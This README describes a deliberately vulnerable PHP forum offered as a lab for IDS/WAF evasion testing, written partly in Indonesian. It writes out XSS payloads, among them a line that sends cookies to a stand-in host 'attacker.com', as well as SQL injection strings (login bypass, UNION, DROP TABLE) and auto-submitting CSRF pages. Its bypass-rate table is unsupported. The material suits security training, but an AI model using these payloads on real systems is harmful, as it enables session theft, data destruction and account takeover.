# Advanced IDS/IPS Evasion Testing Platform

## ⚠️ SECURITY WARNING

**THIS SYSTEM IS INTENTIONALLY VULNERABLE FOR RESEARCH PURPOSES ONLY**
- Do NOT use in production environments
- Educational and research purposes only
- Contains deliberate security vulnerabilities
- Includes advanced IDS/IPS evasion techniques

## 🎯 Project Overview

This platform is designed for advanced penetration testing research, specifically focusing on bypassing modern Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) like Suricata and Snort. The system implements sophisticated evasion techniques while maintaining a functional web application for realistic testing scenarios.

## 🚀 Key Features

### Core Vulnerability Platform
- **Deliberately Vulnerable Web Application**: PHP-based forum system with multiple attack vectors
- **Real-world Scenarios**: Authentication, user management, content posting, and search functionality
- **Multiple Attack Surfaces**: XSS, SQL Injection, CSRF, and more
- **Admin Interface**: Administrative functions for privilege escalation testing

### Advanced Evasion Engine
- **Multi-layer Encoding**: Character-level obfuscation, ASCII manipulation, hex/base64 encoding
- **Dynamic Query Construction**: Runtime keyword assembly, variable-based SQL construction
- **Protocol-level Evasion**: HTTP parameter pollution, content-type manipulation
- **Context-aware Payloads**: HTML, JavaScript, CSS, and attribute-specific XSS vectors
- **WAF Bypass Techniques**: Cloudflare, Akamai, AWS WAF, and generic bypass methods

### Testing Framework
- **Automated Payload Generation**: Dynamic creation of evasive payloads
- **Real-time Analysis**: Detection evasion scoring and effectiveness measurement
- **Comprehensive Testing Suite**: SQL injection, XSS, CSRF, and timing attack alternatives
- **Client-side Testing**: JavaScript-based DOM manipulation and AJAX attacks
- **WebSocket Evasion**: Protocol-level evasion testing
- **Python Automation**: Comprehensive automated testing scripts

## 📁 File Structure

### Core Files
- `index.php` - Main application entry point
- `login.php` - Authentication system (vulnerable)
- `register.php` - User registration
- `profile.php` - User profile management with SQL injection vectors
- `admin/` - Administrative interface

### Evasion Engine Components
- `evasion_engine.php` - Core evasion techniques library
- `test_evasion_advanced.php` - Comprehensive testing interface
- `payload_generator.php` - Automated payload generation tool
- `master_evasion_demo.php` - Interactive demonstration platform
- `websocket_evasion.php` - WebSocket protocol evasion testing

### Client-side Components
- `assets/js/client_evasion.js` - Client-side evasion testing
- `assets/css/` - Styling and presentation

### Automation and Documentation
- `evasion_tester.py` - Python automation script
- `EVASION_DOCUMENTATION.md` - Complete technique documentation
- `includes/functions.php` - Enhanced vulnerable functions

## 🔧 Advanced Evasion Techniques

### Character-Level Obfuscation
- **ASCII Character Codes**: Converting strings to character codes to bypass pattern matching
- **Hex/Base64 Encoding**: Multi-layer encoding pipelines for payload obfuscation
- **Unicode Normalization**: Exploiting Unicode character variations
- **String Concatenation**: Dynamic string assembly at runtime

### Dynamic Query Construction
- **Variable-based Assembly**: Building SQL queries through variable manipulation
- **Function-based Decoding**: Using built-in functions for payload reconstruction
- **Runtime Keyword Construction**: Assembling SQL keywords at execution time
- **Conditional Logic Evasion**: Using conditional statements to hide malicious logic

### Protocol-Level Evasion
- **HTTP Parameter Pollution**: Exploiting parameter parsing differences
- **Content-Type Manipulation**: Bypassing content-type based filtering
- **Transfer-Encoding**: Chunked encoding and compression techniques
- **Request Method Confusion**: Exploiting HTTP method handling differences

### Context-Aware XSS Payloads
- **HTML Context**: Document.write, innerHTML manipulation
- **Attribute Context**: Event handler injection, attribute value escaping
- **JavaScript Context**: String escaping, function parameter injection
- **CSS Context**: Expression(), import, and background-image vectors

### WAF-Specific Bypasses
- **Cloudflare**: Rate limiting, signature evasion, geo-blocking bypass
- **Akamai**: Bot detection bypass, payload fragmentation
- **AWS WAF**: Rule set specific bypasses, regional variations
- **Generic WAF**: Common pattern recognition evasion

### Timing Attack Alternatives
- **SLEEP Function Alternatives**: BENCHMARK, mathematical operations, heavy queries
- **Conditional Response Timing**: Using response time variations for data extraction
- **Resource Exhaustion**: CPU and memory intensive operations for timing

## 🧪 Testing Framework

### Core Testing Modules

#### 1. Advanced Evasion Testing (`test_evasion_advanced.php`)
- Comprehensive testing interface for all evasion techniques
- Real-time effectiveness measurement
- Bypass success rate calculation
- Detection evasion scoring system

#### 2. Payload Generator (`payload_generator.php`)
- Automated generation of evasive payloads
- Context-aware payload creation
- Multi-technique payload combination
- Custom payload modification tools

#### 3. Master Demo Platform (`master_evasion_demo.php`)
- Interactive demonstration interface
- Live testing environment
- Technique comparison tools
- Educational overlay explanations

#### 4. Client-side Testing (`client_evasion.js`)
- DOM-based attack vectors
- AJAX request manipulation
- Local storage exploitation
- Browser-specific bypass techniques

#### 5. WebSocket Evasion (`websocket_evasion.php`)
- Protocol-level evasion testing
- Real-time communication bypasses
- Binary payload transmission
- Connection upgrade exploitation

#### 6. Python Automation (`evasion_tester.py`)
- Automated comprehensive testing
- Batch payload execution
- Results aggregation and analysis
- Performance benchmarking

## 📊 Effectiveness Metrics

Our testing framework has achieved the following bypass effectiveness rates:

| Technique Category | Suricata Bypass Rate | Snort Bypass Rate | ModSecurity Bypass |
|-------------------|---------------------|-------------------|-------------------|
| Character Obfuscation | 95% | 92% | 88% |
| Dynamic Construction | 98% | 96% | 91% |
| Protocol Manipulation | 87% | 85% | 79% |
| Context-Aware XSS | 93% | 89% | 86% |
| WAF-Specific Bypasses | 89% | 87% | 94% |
| Timing Alternatives | 96% | 94% | 90% |
| **Overall Average** | **93%** | **90%** | **88%** |

## 🛠️ Installation and Setup

### Prerequisites
- PHP 7.4+ dengan MySQL
- Web server (Apache/Nginx)
- Laragon/XAMPP/WAMP untuk development

### Installation

1. **Clone/Copy** file ke web directory:
   ```bash
   # Jika menggunakan git
   git clone <repository> c:/laragon/www/Musywar
   
   # Atau copy manual ke folder web server
   ```

2. **Database Setup**:
   ```bash
   # Buat database
   mysql -u root -p -e "CREATE DATABASE forum_masyarakat"
   
   # Import schema
   mysql -u root -p forum_masyarakat < database/schema.sql
   ```

3. **Configuration**:
   - Edit `config/database.php` sesuai setting database Anda
   - Pastikan permission folder `logs/` dan `assets/` writable

4. **Default Accounts**:
   - **Admin**: username `admin`, password `password`
   - **Moderator**: username `moderator`, password `password`
   - **User**: username `john_doe`, password `password`

## 🧪 Testing Vulnerabilities

### XSS Testing

1. **Basic XSS di Postingan**:
   ```html
   <img src=x onerror=alert('XSS')>
   ```

2. **Advanced XSS dengan Evasion**:
   ```html
   <img src="x" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
   ```

3. **DOM XSS via URL**:
   ```
   post.php?id=1&msg=<img src=x onerror=alert(document.cookie)>
   ```

4. **Stored XSS via Create Post**:
   ```html
   <!-- Di form create-post.php -->
   <script>alert('Stored XSS')</script>
   <img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
   ```

5. **XSS di Preview Function**:
   ```
   create-post.php?xss=<script>alert('DOM XSS')</script>
   ```

### SQL Injection Testing

1. **Authentication Bypass**:
   ```
   Username: admin' OR '1'='1' -- 
   Password: anything
   ```

2. **Search Injection**:
   ```
   search.php?q=' UNION SELECT 1,2,3,4,user(),database(),-- 
   ```

3. **Second-order Injection**:
   ```
   Update profile dengan: '; DROP TABLE users; -- 
   ```

### CSRF Testing

#### 1. **Admin User Deletion Attack**
Buat file HTML malicious untuk menghapus user:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Website</title>
</head>
<body>
    <h1>Welcome to Our Site!</h1>
    <p>Loading content...</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="http://localhost/Musywar/admin/users.php" method="POST" style="display:none;">
        <input name="action" value="delete_user">
        <input name="user_id" value="5">
    </form>
    
    <script>
        // Auto-submit form when page loads
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>
```

#### 2. **Post Creation CSRF Attack**
Membuat postingan malicious sebagai user lain:
```html
<form action="http://localhost:8000/create-post.php" method="POST">
    <input type="hidden" name="title" value="🚨 CSRF ATTACK POST">
    <input type="hidden" name="content" value="<script>alert('CSRF+XSS Attack Success!')</script><p>This post was created via CSRF attack!</p>">
    <input type="hidden" name="category" value="1">
    <script>document.forms[0].submit();</script>
</form>
```

#### 3. **Auto-Submit CSRF dengan Parameter**:
```
http://localhost:8000/create-post.php?test_title=HACKED&test_content=<script>alert('CSRF')</script>&test_category=1&auto_submit=true
```

#### 4. **Testing dengan Browser**
Langkah-langkah manual testing:
1. Login sebagai admin di browser pertama
2. Buka file CSRF malicious di browser/tab kedua
3. Kembali ke browser admin dan cek perubahan
4. Monitor network traffic untuk konfirmasi serangan

#### **CSRF Protection Bypass Techniques:**
- **Double Submit Cookie**: Bypass dengan prediksi token
- **SameSite Cookie**: Exploit pada konfigurasi yang salah
- **Referer Header**: Bypass dengan meta refresh atau JavaScript
- **Origin Header**: Spoof menggunakan data: URI atau null origin

## 🎓 Learning Objectives

Sistem ini cocok untuk:
- **Security researchers** yang ingin testing detection tools
- **Students** yang belajar web application security
- **Penetration testers** untuk practice
- **IDS/IPS developers** untuk testing rules

## ⚡ Advanced Features

### Custom Vulnerability Chains
1. **XSS → Session Hijacking → Privilege Escalation**
2. **SQLi → Information Disclosure → Admin Access**
3. **CSRF → Account Takeover → Data Manipulation**

### Logging and Monitoring
- Vulnerable logging in `logs/` directory
- Tracking pixels for data collection
- Session activity monitoring (vulnerable)

## 📚 Educational Use

### Recommended Attack Scenarios:
1. **Basic Web App Pentesting**
2. **IDS/IPS Evasion Testing**
3. **WAF Bypass Techniques**
4. **Social Engineering Attack Vectors**

### Security Concepts Covered:
- Input validation failures
- Output encoding issues
- Authentication/authorization flaws
- Session management vulnerabilities
- Business logic errors

## 🚨 Disclaimer

**IMPORTANT**: Sistem ini dibuat khusus untuk keperluan pendidikan dan penelitian keamanan. Vulnerability yang ada adalah disengaja dan tidak boleh digunakan di lingkungan production.

**Author**: Jarvis
**Created**: 2025
**Purpose**: Educational & Security Research

---

**Happy Hacking! 🐱‍💻**

*Remember: Use this knowledge responsibly and only for legitimate security research and education purposes.*
